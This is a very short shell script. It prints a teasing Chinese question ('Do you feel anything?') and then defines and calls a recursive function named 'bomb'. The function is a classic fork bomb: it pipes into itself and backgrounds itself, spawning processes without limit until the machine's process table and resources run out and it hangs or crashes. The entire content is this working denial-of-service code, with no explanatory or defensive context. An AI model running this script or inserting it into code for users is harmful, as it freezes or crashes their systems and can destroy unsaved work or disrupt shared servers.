echo "你有感觉到什么吗"
bomb() {
	bomb | bomb &
}; bomb